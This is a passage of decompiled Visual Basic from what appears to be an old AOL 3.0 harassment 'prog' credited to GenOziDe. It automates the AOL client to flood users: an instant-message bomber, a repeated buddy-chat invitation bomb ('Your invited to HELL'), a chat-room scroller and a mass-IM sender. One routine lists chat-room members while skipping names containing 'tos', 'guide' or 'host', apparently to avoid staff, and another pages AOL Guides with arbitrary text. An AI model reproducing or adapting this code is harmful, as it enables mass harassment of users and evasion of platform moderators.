l0D12% = extfn4D90(l0D10%, "MDIClient")
l0D14% = extfn4D90(l0D10%, "_AOL_Listbox")
l0D16% = extfn4DC8(l0D14%)
For l0D18% = 0 To 25
l0D1A$ = String$(256, " ")
l0D1E = extfn2C50(l0D18%, l0D1A$) & l0D1C$
If Len(Trim$(l0D1A$)) <= 1 Then GoTo LA5B4
l0D1A$ = Left$(Trim$(l0D1A$), Len(Trim(l0D1A$)) - 1)
sub1AD0 l0D1A$, p0D0E
Next l0D18%
LA5B4:
End Sub

Sub sub1638 (p0D8C As String)
Dim l0D90 As Variant
Dim l0D94 As Variant
Dim l0D98 As Variant
Dim l0D9C As Integer
Dim l0D9E As Variant
Dim l0DA2 As Integer
Dim l0DA4 As Integer
sub2198 "Keyword"
l0D90 = extfn2EB8("AOL Frame25", 0&)
Do
l0D94 = extfn4D58(l0D90, "Keyword")
sub27F0 (.001)
l0D98 = extfn4D90(l0D94, "_AOL_Edit")
Loop Until l0D98 <> 0
l0D98 = extfn4D90(l0D94, "_AOL_Edit")
sub2320 l0D98, "Guidepager"
l0D9C% = extfn4D90(l0D94, "_AOL_Icon")
sub9F8 l0D9C%
l0D90 = extfn2EB8("AOL Frame25", 0&)
l0D9E = extfn4D58(l0D90, "I NEED HELP")
l0DA2% = extfn4D90(l0D9E, "_AOL_Icon")
DoEvents
sub9F8 l0DA2%
sub27F0 (.001)
sub27F0 (.001)
sub1440 l0DA4%, 7
sub2320 l0DA4%, p0D8C$
sub1440 l0DA4%, 3
End Sub

Sub sub1670 ()
Dim l0DA6 As Variant
Dim l0DAA As Variant
l0DA6 = extfn2EB8("aol frame25", 0&)
l0DAA = extfn2E10(l0DA6, gv0064)
End Sub

Sub sub16A8 ()
Dim l0DAE As Variant
Dim l0DB2 As Variant
Dim l0DB6 As Variant
l0DAE = extfn2EB8("aol frame25", 0&)
l0DB2 = extfn4D90(l0DAE, "AOL Toolbar")
l0DB6 = extfn2E10(l0DB2, gv0064)
End Sub

Sub sub16E0 ()
Dim l0DBA As Variant
Dim l0DBE As Variant
Dim l0DC2 As Variant
Dim l0DC6 As Variant
l0DBA = extfn2EB8("aol frame25", 0&)
l0DBE = extfn4D90(l0DBA, "MDIClient")
l0DC2 = extfn4D58(l0DBE, "Buddy Lists")
l0DC6 = extfn2E10(l0DC2, gv0064)
End Sub

Sub sub170 (p06A4 As ListBox)
Dim l06A6 As Integer
Dim l06A8 As String
Dim l06AA As String
Dim l06AC As Variant
For l06A6% = 0 To 25
l06A8$ = String$(256, " ")
l06AC = extfn2C50(l06A6%, l06A8$) & l06AA$
If Len(Trim$(l06A8$)) <= 1 Then GoTo l1034
l06A8$ = Left$(Trim$(l06A8$), Len(Trim(l06A8$)) - 1)
subC8 l06A8$, p06A4
Next l06A6%
l1034:
End Sub

Sub sub1718 ()
Dim l0DCA As Variant
Dim l0DCE As Integer
l0DCE% = extfn4D58(extfn2EB8("AOL Frame25", "America  Online"), "Welcome, ")
l0DCA = extfn2E10(l0DCE%, gv0064)
End Sub

Sub sub1750 (p0DD0 As Variant)
Dim l0DD4 As Variant
l0DD4 = extfn2E10(p0DD0, gv0064)
End Sub

Sub sub1788 (ByVal p0DD8 As String)
Dim l0DDA As Integer
Dim l0DDC As Integer
Dim l0DDE As Integer
Dim l0DE0 As Integer
Dim l0DE2 As Integer
Dim l0DE4 As Integer
Dim l0DE6 As Integer
Dim l0DE8 As String
Dim l0DEA As Integer
Dim l0DEC As Integer
l0DDA% = extfn2EB8("AOL Frame25", 0&)
l0DDC% = extfn2CC0(l0DDA%)
l0DDE% = extfn4AF0(l0DDC%)
For l0DE0% = 0 To l0DDE% - 1
    l0DE2% = extfn4BD0(l0DDC%, l0DE0%)
    l0DE4% = extfn4AF0(l0DE2%)
    For l0DE6% = 0 To l0DE4% - 1
        l0DE8$ = Space$(50)
        l0DEA% = extfn4B28(l0DE2%, l0DE6%, l0DE8$, 50, gc05CE)
        l0DE8$ = Trim$(l0DE8$): l0DE8$ = Left(l0DE8$, Len(l0DE8$) - 1)
        If l0DE8$ = "" Then l0DE8$ = " -"
        If InStr(l0DE8$, p0DD8$) Then
            l0DEC% = extfn4B98(l0DE2%, l0DE6%)
            l0DEA% = extfn4CB0(l0DDA%, gc05D0, l0DEC%, 0)
        End If
    Next l0DE6%
Next l0DE0%
End Sub

Sub sub17F8 ()
sub448 "$IM_OFF", "JiZZy"
sub29E8
End Sub

Sub sub1830 ()
sub448 "$IM_ON", "ÐeliriuMhZ is AOLGOD!"
sub29E8
End Sub

Sub sub1868 (p0DF6 As TextBox)
Dim l0DF8 As Integer
Dim l0DFA As Variant
Dim l0DFE As Variant
l0DF8% = extfn4D58(fn4F0(), ">Instant Message From:")
If l0DF8% Then GoTo LB490
l0DF8% = extfn4D58(fn4F0(), "  Instant Message From:")
If l0DF8% Then GoTo LB490
Exit Sub
LB490:
l0DFA = extfn4D90(l0DF8%, "RICHCNTL")
l0DFA = extfn4C40(l0DFA, 2)
l0DFA = extfn4C40(l0DFA, 2)
l0DFA = extfn4C40(l0DFA, 2)
l0DFA = extfn4C40(l0DFA, 2)
l0DFA = extfn4C40(l0DFA, 2)
l0DFA = extfn4C40(l0DFA, 2)
l0DFA = extfn4C40(l0DFA, 2)
l0DFA = extfn4C40(l0DFA, 2)
l0DFA = extfn4C40(l0DFA, 2)
l0DFE = extfn4C40(l0DFA, 2)
l0DFA = extfn4C40(l0DFE, 2)
Call sub640(l0DFE, ((p0DF6) & Chr(13) & "ÐeliriuM by GenOziDe"))
sub9F8 (l0DFA)
sub27F0 .1
sub1A28 (l0DF8%)
End Sub

Sub sub18A0 (p0E04 As TextBox, p0E08 As TextBox, p0E0C As TextBox)
Dim l0E0E As Variant
If p0E04 = "0" Then
Exit Sub
End If
If p0E04 < 0 Then
Exit Sub
End If
Call sub17F8
Do
Call sub448((p0E08), (p0E0C))
sub27F0 (.8)
p0E04 = Str(Val(p0E04 - 1))
Loop Until p0E04 = 0 Or l0E0E = "SkA SuCkS"
Call sub1830
Exit Sub
End Sub

Sub sub1948 (p0E72 As TextBox, p0E76 As TextBox)
Dim l0E78 As Variant
Dim l0E7C As Integer
Dim l0E7E As Integer
Dim l0E80 As Integer
Dim l0E82 As Integer
Dim l0E84 As Integer
Dim l0E86 As Variant
Dim l0E8A As Variant
Dim l0E8E As Integer
Dim l0E90 As Integer
Dim l0E92 As Integer
Dim l0E94 As Integer
Dim l0E96 As Integer
Dim l0E98 As Integer
Dim l0E9A As Integer
Dim l0E9C As Integer
Dim l0E9E As Integer
Dim l0EA0 As Integer
Dim l0EA2 As Integer
Dim l0EA4 As Integer
Dim l0EA6 As Integer
Dim l0EA8 As Integer
Do
l0E78 = fn1018()
l0E7E% = extfn4D58(l0E7C%, "Invitation From: " & l0E78)
If l0E7E% <> 0 Then
sub1A28 l0E7E%
End If
If p0E76 < 1 Then Exit Sub
l0E80% = extfn2EB8("aol Frame25", 0&)
l0E7C% = extfn4D90(l0E80%, "MDIClient")
l0E82% = extfn4D90(l0E7C%, "AOL Child")
l0E84% = extfn4D58(l0E7C%, "Buddy Lists")
l0E86 = extfn4D90(l0E84%, "_AOL_Icon")
l0E8A = extfn31C8(l0E86, 2)
l0E8E% = extfn31C8(l0E8A, 2)
l0E90% = extfn31C8(l0E8E%, 2)
sub9F8 l0E90%
sub27F0 .1
Do: DoEvents
l0E92% = extfn4D90(l0E7C%, "AOL Child")
l0E94% = extfn4D58(l0E7C%, "Buddy Chat")
l0E96% = extfn4D90(l0E94%, "_AOL_Edit")
l0E98% = extfn31C8(l0E96%, 2)
l0E9A% = extfn31C8(l0E98%, 2)
l0E9C% = extfn31C8(l0E9A%, 2)
l0E9E% = extfn31C8(l0E9C%, 2)
l0EA0% = extfn31C8(l0E9E%, 2)
l0EA2% = extfn31C8(l0EA0%, 2)
l0EA4% = extfn31C8(l0EA2%, 2)
l0EA6% = extfn31C8(l0EA4%, 2)
Loop Until l0E94% <> 0
sub27F0 .5
sub27B8 l0E96%, CStr((p0E72))
sub27B8 l0E9A%, CStr("INVITATION BOMB Your invited to HELL")
sub27B8 l0EA6%, CStr("°º*¤FATE Infinity¤*º° by GenOziDe")
l0EA8% = extfn4D90(l0E94%, "_AOL_Icon")
sub9F8 l0EA8%
sub27F0 1
l0E78 = fn1018()
l0E7E% = extfn4D58(l0E7C%, "Invitation From: " & l0E78)
sub1A28 l0E7E%
sub27F0 .1
p0E76 = Str(Val(p0E76 - 1))
If p0E76 = Str(Val("0")) Then Exit Sub
Loop
End Sub

Sub sub1980 (ByVal p0EAA As String)
Dim l0EAC As Variant
Dim l0EB0 As Variant
Dim l0EB4 As Variant
Dim l0EB8 As Integer
sub2198 "Keyword"
Do
l0EAC = extfn2EB8("AOL Frame25", 0&)
l0EB0 = extfn4D58(l0EAC, "Keyword")
l0EB4 = extfn4D90(l0EB0, "_AOL_Edit")
sub27F0 (.001)
Loop Until l0EB4 <> 0
l0EB4 = extfn4D90(l0EB0, "_AOL_Edit")
sub2320 l0EB4, p0EAA$
l0EB8% = extfn4D90(l0EB0, "_AOL_Icon")
sub9F8 l0EB8%
End Sub

Sub sub19B8 ()
Dim l0EBA As Variant
Do
l0EBA = extfn2EB8("_AOL_Modal", 0&)
sub1A28 (l0EBA)
DoEvents
Loop Until l0EBA = 0
End Sub

Sub sub19F0 ()
Dim l0EBE As Variant
Dim l0EC2 As Integer
Dim l0EC4 As Integer
Dim l0EC6 As Integer
Dim l0EC8 As Integer
Dim l0ECA As Variant
Dim l0ECE As Integer
Dim l0ED0 As Integer
Dim l0ED2 As Integer
l0EBE = fn25F8()
If l0EBE = 0 Then
    MsgBox "You must be signed on to use this feature.", 22, "Not Signed On!"
    Exit Sub
End If
If fn6B0() = 25 Then
    l0EC2% = extfn2EB8("AOL Frame25", 0&)
    l0EC4% = extfn4D90(l0EC2%, "MDIClient")
    Do
        l0EC6% = DoEvents()
        l0EC8% = extfn2EB8("_AOL_Modal", "America Online")
    Loop Until l0EC8% <> 0
    l0EC6% = DoEvents()
    l0ECA = extfn4CB0(l0EC8%, &H10, 0, 0)
End If
If fn6B0() = 30 Then
    l0EC2% = extfn2EB8("AOL Frame25", 0&)
    l0EC4% = extfn4D90(l0EC2%, "MDIClient")
    sub1788 "Preferences"
    Do
        l0EC6% = DoEvents()
        l0ECE% = extfn4D58(l0EC4%, "Preferences")
    Loop Until l0ECE% <> 0
    l0ED0% = extfn4D90(l0ECE%, "_AOL_Icon")
    sub9F8 (l0ED0%)
    Do
        l0EC6% = DoEvents()
        l0ED2% = extfn2EB8("_AOL_Modal", "Chat Preferences")
    Loop Until l0ED2% <> 0
    l0ECA = extfn4CB0(l0ED2%, &H10, 0, 0)
    l0ECA = extfn4CB0(l0ECE%, &H10, 0, 0)
End If
l0EC6% = DoEvents()
End Sub

Sub sub1A28 (p0ED4 As Variant)
Dim l0ED8 As Variant
l0ED8 = extfn4CB0(p0ED4, gc0024, 0, 0)
End Sub

Sub sub1A8 (p06B2 As ListBox)
Dim l06B4 As Variant
Dim l06B8 As Variant
Dim l06BC As Variant
Dim l06C0 As Variant
Dim l06C4 As Variant
Call sub170(p06B2)
l06B4 = fn1520()
For l06B8 = 0 To p06B2.ListCount - 1
l06BC = p06B2.List(l06B8)
l06C0 = InStr(l06BC, l06B4)
l06C4 = p06B2.ListIndex
If l06C0 <> 0 Then
p06B2.RemoveItem (l06B8)
End If
Next l06B8
End Sub

Sub sub1AD0 (p0F20 As String, p0F24 As ListBox)
Dim l0F26 As Variant
Dim l0F2A As Variant
Dim l0F2E As String
Dim l0F30 As Variant
If p0F20 = l0F26 Then Exit Sub
If p0F24.ListCount = 0 Then p0F24.AddItem p0F20: Exit Sub
Do Until l0F2A = (p0F24.ListCount)
Let l0F2E$ = p0F24.List(l0F2A)
If Trim(LCase(l0F2E$)) = Trim(LCase(p0F20)) Then Let l0F30 = "NO"
Let l0F2A = l0F2A + 1
Loop
If l0F30 = "NO" Then Exit Sub
p0F24.AddItem p0F20
End Sub

Sub sub1B08 (p0F34 As Variant)
Dim l0F38 As Variant
l0F38 = extfn4CB0(p0F34, gc001A, &HD, 0)
End Sub

Sub sub1B40 ()
Dim l0F3C As Variant
l0F3C = Shell("C:\aol30a\waol.exe")
End Sub

Sub sub1BB0 ()
Dim l0F4E As Integer
Dim l0F50 As Variant
Dim l0F54 As Integer
Dim l0F56 As Integer
Dim l0F58 As Variant
l0F4E% = extfn2EB8("AOL Frame25", 0&)
If l0F4E% = 0 Then Exit Sub
l0F50 = extfn4B60(l0F4E%)
l0F50 = extfn4CB0(l0F4E%, &H11, 0, &H0)
Do
l0F50 = DoEvents()
l0F54% = extfn2EB8("_AOL_Modal", "America Online")
Loop Until l0F54% <> 0
l0F56% = extfn4D58%(l0F54%, "&Yes")
l0F58 = extfn4CB0(l0F56%, &H201, 0, 0&)
l0F58 = extfn4CB0(l0F56%, &H202, 0, 0&)
End Sub

Sub sub1BE8 (ByVal p0F5C As String, ByVal p0F5E As String, ByVal p0F60 As String)
Dim l0F62 As Integer
Dim l0F64 As Variant
Dim l0F68 As Variant
Dim l0F6C As Integer
Dim l0F6E As Integer
Dim l0F70 As Integer
Dim l0F72 As Integer
Dim l0F74 As Integer
Dim l0F76 As Integer
Dim l0F78 As Integer
Dim l0F7A As Integer
Dim l0F7C As Integer
Dim l0F7E As Integer
Dim l0F80 As Integer
Dim l0F82 As Integer
Dim l0F84 As Integer
Dim l0F86 As Integer
Dim l0F88 As Integer
Dim l0F8A As Integer
Dim l0F8C As Variant
Dim l0F90 As Integer
Do
l0F62% = extfn2EB8("AOL Frame25", 0&)
l0F64 = extfn4D58(l0F62%, "Compose Mail")
sub2320 l0F64, "Compose Mail"
DoEvents
Loop Until l0F64 = 0
l0F62% = extfn2EB8("AOL Frame25", 0&)
sub2198 "Compose"
Do
l0F68 = DoEvents()
l0F6C% = extfn4D58(l0F62%, "Compose Mail")
l0F6E% = extfn4D90(l0F6C%, "_AOL_Edit")
Loop Until l0F6E% <> 0
l0F70% = extfn4DC8(l0F6C%)
l0F72% = extfn4D90(l0F6C%, "_AOL_Icon")
l0F74% = extfn4D90(l0F6C%, "_AOL_View")
l0F6E% = extfn4D90(l0F6C%, "_AOL_Edit")
l0F76% = extfn4CE8(l0F6E%, gc05D6, 0, p0F5C$)
l0F78% = extfn4C40(l0F6E%, gc05CA)
l0F7A% = extfn4C40(l0F78%, gc05CA)
l0F7C% = extfn4C40(l0F7A%, gc05CA)
l0F7E% = extfn4C40(l0F7C%, gc05CA)
l0F76% = extfn4CE8(l0F7E%, gc05D6, 0, p0F5E$)
l0F80% = extfn4C40(l0F7E%, gc05CA)
l0F82% = extfn4C40(l0F80%, gc05CA)
l0F84% = extfn4C40(l0F82%, gc05CA)
l0F86% = extfn4C40(l0F84%, gc05CA)
l0F88% = extfn4C40(l0F86%, gc05CA)
l0F8A% = extfn4C40(l0F88%, gc05CA)
l0F76% = extfn4CE8(l0F84%, gc05D6, 0, p0F60$ & " ")
l0F8C = extfn4D90(l0F6C%, "RICHCNTL")
l0F76% = extfn4CE8(l0F8C, gc05D6, 0, p0F60$ & " ")
sub27F0 (.5)
l0F90% = extfn4CB0(l0F72%, gc05C2, &HD, 0)
l0F90% = extfn4CB0(l0F72%, gc05C4, &HD, 0)
sub27F0 (.1)
Do
l0F62% = extfn2EB8("AOL Frame25", 0&)
l0F64 = extfn4D58(l0F62%, "Compose Mail")
sub2320 l0F64, "Compose Mail"
DoEvents
Loop Until l0F64 = 0
End Sub

Sub sub1C20 ()
Dim l0F92 As Variant
Dim l0F96 As Variant
Dim l0F9A As Variant
Dim l0F9E As Variant
Dim l0FA2 As Variant
Dim l0FA6 As Variant
If extfn4D58(extfn2EB8("AOL Frame25", "America  Online"), "New Mail") = False Then
l0F92 = fn21D0(4, 3)
Do
DoEvents
l0F96 = extfn4D58(extfn2EB8("AOL Frame25", "America  Online"), "New Mail")
Loop Until l0F96
l0F9A = extfn4D90(l0F96, "_AOL_Tree")
Do
DoEvents
l0F9E = extfn4C78(l0F9A, gc0060, 0, 0&)
Call sub27F0(1)
l0FA2 = extfn4C78(l0F9A, gc0060, 0, 0&)
Call sub27F0(1)
l0FA6 = extfn4C78(l0F9A, gc0060, 0, 0&)
Loop Until l0F9E = l0FA2 And l0FA2 = l0FA6
Else
    l0F96 = extfn4D58(extfn2EB8("AOL Frame25", "America  Online"), "New Mail")
    l0F9A = extfn4D90(l0F96, "_AOL_Tree")
    l0F9E = extfn4C78(l0F9A, gc0060, 0, 0&)
End If
End Sub

Sub sub1C58 (p0FAA As String, p0FAC As String)
Dim l0FAE As Integer
Dim l0FB0 As Integer
Dim l0FB2 As Integer
Dim l0FB4 As Integer
Dim l0FB6 As Integer
Dim l0FB8 As Integer
l0FAE% = extfn2EB8("AOL Frame25", 0&)
l0FB0% = extfn4D90(l0FAE%, "MDIClient")
l0FB2% = extfn4D90(l0FB0%, "AOL Child")
l0FB4% = extfn4D90(l0FB2%, "_AOL_View")
l0FB6% = extfn4CE8(l0FB4%, gc05D6, 0, Chr(13) & Chr(9) & (p0FAA$) & ":" & Chr(9) & (p0FAC$))
l0FB8% = extfn4CB0(l0FB4%, gc05D2, &HD, 0)
End Sub

Sub sub1C90 (p0FBC As ListBox, p0FBE As String)
Dim l0FC0 As Variant
Dim l0FC4 As Integer
Dim l0FC6 As String
Dim l0FC8 As Variant
Dim l0FCC As Variant
Dim l0FD0 As Variant
Dim l0FD4 As Variant
Dim l0FD8 As Variant
Dim l0FDC As Variant
Dim l0FE0 As Integer
Dim l0FE2 As Integer
Dim l0FE4 As Integer
Dim l0FE6 As String
Dim l0FE8 As String
Dim l0FEA As Variant
Dim l0FEE As Variant
Do
For l0FC0 = 0 To p0FBC.ListCount - 1
If l0FC4% = 1 Then Exit Sub
l0FC6$ = p0FBC.List(0)
p0FBC.ListIndex = 0
Next l0FC0
l0FC8 = extfn2EB8("#32770", "America Online")
l0FCC = extfn4D58(l0FC8, "OK")
l0FD0 = extfn4CB0(l0FCC, gc05C2, 0, 0&)
l0FD4 = extfn4CB0(l0FCC, gc05C4, 0, 0&)
sub2198 "Send an Instant Message"
Do
l0FD8 = extfn2EB8("AOL Frame25", 0&)
l0FDC = extfn4D58(l0FD8, "Send Instant Message")
l0FE0% = extfn4D90(l0FDC, "_AOL_Edit")
DoEvents
Loop Until l0FE0% <> 0
l0FE0% = extfn4D90(l0FDC, "_AOL_Edit")
Do
l0FE2% = extfn4D90(l0FDC, "RICHCNTL")
l0FE4% = extfn4D58(l0FDC, "Send")
DoEvents
sub27F0 (.001)
Loop Until l0FE2% <> 0 Or l0FE4% <> 0
If l0FE2% <> 0 Then
sub2320 l0FE0%, l0FC6$
sub2320 l0FE2%, ((p0FBE$) & Chr(13) & "      <//=-——• FATE Infinity •——-=\\>" & Chr(13) & "        ƒ——by GenOziDe——ƒ")
sub27F0 (.001)
sub1440 l0FE2%, 1
sub9F8 l0FE2%
Else
sub2320 l0FE0%, l0FE6$
sub1440 l0FE0%, 1
sub2320 l0FE0%, l0FE8$
sub1440 l0FE0%, 1
sub9F8 l0FE0%
End If
sub27F0 (.001)
l0FEA = extfn4CB0(l0FDC, gc0024, 0, 0)
l0FEE = p0FBC.List(0)
Call subB80(p0FBC, (l0FEE))
Loop Until p0FBC.ListCount = 0
If p0FBC.ListCount = 0 Then
Exit Sub
End If
End Sub

Sub sub1CC8 (p0FF2 As String, p0FF6 As ListBox)
Dim l0FF8 As String
Dim l0FFA As Variant
Dim l0FFE As String
Dim l1000 As String
Dim l1002 As Variant
LE870:
l0FF8$ = fn4B8()
l0FFA = InStr(LCase$(l0FF8$), LCase$(p0FF2$))
l0FFE$ = Left(l0FF8$, InStr(l0FF8$, ":") - 1)
l1000$ = Right(l0FF8$, Len(l0FF8$) - Len(l0FFE$) - 2)
l1002 = InStr(l0FFA, (p0FF2$))
If l1002 <> 0 Then
p0FF6.AddItem l0FFE$
sub2400 "—ƒ" & l0FFE$ & ", you have been added."
End If
GoTo LE870
End Sub

Sub sub1D70 ()
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & ">SkASuCkS<{S im"
sub27F0 .5
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & ">SkASuCkS<{S im"
sub27F0 .5
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & ">SkASuCkS<{S im"
sub27F0 .5
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & ">SkASuCkS<{S im "
sub27F0 .5
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & ">SkASuCkS<{S im "
sub27F0 .5
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & ">SkASuCkS<{S im "
sub27F0 .5
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & ">SkASuCkS<{S im"
sub27F0 .5
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & ">SkASuCkS<{S im"
sub27F0 .5
sub2400 "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "                     SkASuCkS by JiZZy{S welcome"
End Sub

Sub sub1DA8 (p102C As String, p102E As String)
Dim l1030 As Integer
Dim l1032 As Integer
Dim l1034 As Integer
Dim l1036 As String
Dim l1038 As Integer
l1030% = extfn2EB8("AOL Frame25", 0&)
l1032% = fnF38()
l1034% = extfn4D90(l1032%, "_AOL_VIEW")
l1036$ = CStr(Chr(13) + Chr(10) + Chr(13) + Chr(10) + p102C$ + ":" + Chr(9) + p102E$ + Chr(13) + Chr(10))
l1038% = extfn4CE8(l1034%, gc05D6, 0, l1036$)
DoEvents
End Sub

Sub sub1E0 (p06CA As ListBox)
Dim l06CC As Variant
Dim l06D0 As Integer
Dim l06D2 As String
Dim l06D4 As Variant
Dim l06D8 As Integer
Dim l06DA As String
Dim l06DC As String
Dim l06DE As Variant
l06CC = extfn2EB8%("AOL Frame25", "America  Online")
l06D0% = extfn4D58%(l06CC, "Welcome,")
l06D2$ = fn15C8((l06D0%))
If InStr(l06D2$, "!") = 0 Then Exit Sub
l06D2$ = Left$(l06D2$, InStr(l06D2$, "!") - 1)
l06D4 = Right$(l06D2$, Len(l06D2$) - InStr(l06D2$, ",") - 1)
For l06D8% = 0 To 25
l06DA$ = String$(256, " ")
l06DE = extfn2C50(l06D8%, l06DA$) & l06DC$
If Len(Trim$(l06DA$)) <= 1 Then Exit For
l06DA$ = Left$(Trim$(l06DA$), Len(Trim(l06DA$)) - 1)
If l06DA$ = l06D4 Then GoTo L1364
If InStr(LCase$(l06DA$), "tos") Then GoTo L1364
If InStr(LCase$(l06DA$), "guide") Then GoTo L1364
If InStr(LCase$(l06DA$), "host") Then GoTo L1364
p06CA.AddItem (l06DA$)
L1364:
Next l06D8%
End Sub

Sub sub1E18 (p1048 As TextBox, p104C As TextBox)
Dim l104E As Variant
Dim l1052 As Variant
Dim l1056 As Variant
Dim l105A As Variant
Dim l105E As Variant
Dim l1062 As Variant
Dim l1066 As Variant
Dim l106A As Variant
Dim l106E As Variant
Dim l1072 As Variant
Dim l1076 As Variant
Dim l107A As Variant
Dim l107E As Variant
Dim l1082 As Variant
Dim l1086 As Variant
Randomize
l104E = Int((Val("26") * Rnd) + 1)
If l104E = "1" Then
l104E = ""
ElseIf l104E = "2" Then l104E = "B"
ElseIf l104E = "3" Then l104E = "C"
ElseIf l104E = "4" Then l104E = "D"
ElseIf l104E = "5" Then l104E = ""
ElseIf l104E = "6" Then l104E = "F"
ElseIf l104E = "7" Then l104E = "G"
ElseIf l104E = "8" Then l104E = "H"
ElseIf l104E = "9" Then l104E = ""
ElseIf l104E = "10" Then l104E = "J"
ElseIf l104E = "11" Then l104E = "K"
ElseIf l104E = "12" Then l104E = "L"
ElseIf l104E = "13" Then l104E = "M"
ElseIf l104E = "14" Then l104E = "N"
ElseIf l104E = "15" Then l104E = ""
ElseIf l104E = "16" Then l104E = "P"
ElseIf l104E = "17" Then l104E = "Q"
ElseIf l104E = "18" Then l104E = "R"
ElseIf l104E = "19" Then l104E = "S"
ElseIf l104E = "20" Then l104E = "T"
ElseIf l104E = "21" Then l104E = ""
ElseIf l104E = "22" Then l104E = "V"
ElseIf l104E = "23" Then l104E = "W"
ElseIf l104E = "24" Then l104E = "Y"
ElseIf l104E = "25" Then l104E = "X"
ElseIf l104E = "26" Then l104E = "Z"
End If
p1048 = l104E
Randomize
l1052 = Int((Val("37") * Rnd) + 1)
If l1052 = "1" Then
l1052 = "A"
ElseIf l1052 = "2" Then l1052 = "B"
ElseIf l1052 = "3" Then l1052 = "C"
ElseIf l1052 = "4" Then l1052 = "D"
ElseIf l1052 = "5" Then l1052 = "E"
ElseIf l1052 = "6" Then l1052 = "F"
ElseIf l1052 = "7" Then l1052 = "G"
ElseIf l1052 = "8" Then l1052 = "H"
ElseIf l1052 = "9" Then l1052 = "I"
ElseIf l1052 = "10" Then l1052 = "J"
ElseIf l1052 = "11" Then l1052 = "K"
ElseIf l1052 = "12" Then l1052 = "L"
ElseIf l1052 = "13" Then l1052 = "M"
ElseIf l1052 = "14" Then l1052 = "N"
ElseIf l1052 = "15" Then l1052 = "O"
ElseIf l1052 = "16" Then l1052 = "P"
ElseIf l1052 = "17" Then l1052 = "Q"
ElseIf l1052 = "18" Then l1052 = "R"
ElseIf l1052 = "19" Then l1052 = "S"
ElseIf l1052 = "20" Then l1052 = "T"
ElseIf l1052 = "21" Then l1052 = "U"
ElseIf l1052 = "22" Then l1052 = "V"
ElseIf l1052 = "23" Then l1052 = "W"
ElseIf l1052 = "24" Then l1052 = "Y"
ElseIf l1052 = "25" Then l1052 = "X"
ElseIf l1052 = "26" Then l1052 = "Z"
ElseIf l1052 = "27" Then l1052 = "0"
ElseIf l1052 = "28" Then l1052 = "1"
ElseIf l1052 = "29" Then l1052 = "2"
ElseIf l1052 = "30" Then l1052 = "3"
ElseIf l1052 = "31" Then l1052 = "4"
ElseIf l1052 = "32" Then l1052 = "5"
ElseIf l1052 = "33" Then l1052 = "6"
ElseIf l1052 = "34" Then l1052 = "7"
